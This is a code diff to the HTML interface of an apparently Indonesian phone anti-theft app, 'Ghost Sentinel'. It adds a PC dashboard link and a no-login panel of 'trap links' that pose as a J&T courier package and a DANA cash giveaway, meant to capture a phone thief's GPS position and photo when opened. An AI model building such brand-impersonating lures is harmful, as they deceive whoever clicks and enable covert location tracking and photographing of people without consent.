@@ -184,12 +184,19 @@
     <div class="brand-icon">🛡️</div>
     <div>
       <div class="brand-name">Ghost <span>Sentinel</span></div>
-      <div style="font-size:10px;color:var(--muted)" id="deviceNameHeader">Memuat…</div>
+      <div style="font-size:10px;color:var(--muted)" id="deviceNameHeader">Cloud Telemetry</div>
     </div>
   </div>
-  <div class="live-badge">
-    <div class="dot-pulse" id="liveDot"></div>
-    <span id="liveLabel">Menghubungkan…</span>
+  <div style="display:flex;align-items:center;gap:10px">
+    <a href="https://sentinel.fiezel.my.id/sentinel.html" target="_blank" style="text-decoration:none">
+      <button class="btn-sm btn-blue" style="font-size:11px;font-weight:700;display:flex;align-items:center;gap:4px">
+        <span>🖥️</span> Dashboard PC
+      </button>
+    </a>
+    <div class="live-badge">
+      <div class="dot-pulse" id="liveDot"></div>
+      <span id="liveLabel">Menghubungkan…</span>
+    </div>
   </div>
 </header>
 
@@ -216,6 +223,26 @@
         </button>
       </div>
       <div id="authError" style="color:#fca5a5;font-size:12px;margin-top:10px;display:none"></div>
+
+      <!-- Quick Trap Links Tanpa Login -->
+      <div style="margin-top:24px;padding-top:16px;border-top:1px solid var(--border)">
+        <div style="font-size:12px;font-weight:800;color:#fda4af;margin-bottom:6px">🎯 Link Jebakan Siap Kirim (Langsung)</div>
+        <div style="font-size:11px;color:var(--muted);margin-bottom:12px;line-height:1.4">
+          HP sudah dicuri? Kirim tautan di bawah ke nomormu via SMS/WA. Saat dibuka maling, posisi GPS &amp; foto langsung tertangkap:
+        </div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <div style="background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:10px;padding:10px">
+            <div style="font-size:12px;font-weight:700;color:#fda4af;margin-bottom:2px">📦 Paket Kurir J&amp;T (99% Dibuka)</div>
+            <div style="font-size:10px;color:var(--muted);margin-bottom:6px">https://sentinel.fiezel.my.id/paket</div>
+            <button class="btn-sm btn-danger" style="width:100%" onclick="copyTrap('https://sentinel.fiezel.my.id/paket')">Salin Link Paket</button>
+          </div>
+          <div style="background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:10px;padding:10px">
+            <div style="font-size:12px;font-weight:700;color:#7dd3fc;margin-bottom:2px">🎁 DANA Kaget Rp 150.000</div>
+            <div style="font-size:10px;color:var(--muted);margin-bottom:6px">https://sentinel.fiezel.my.id/dana</div>
+            <button class="btn-sm btn-blue" style="width:100%" onclick="copyTrap('https://sentinel.fiezel.my.id/dana')">Salin Link DANA</button>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- Dashboard (setelah login) -->
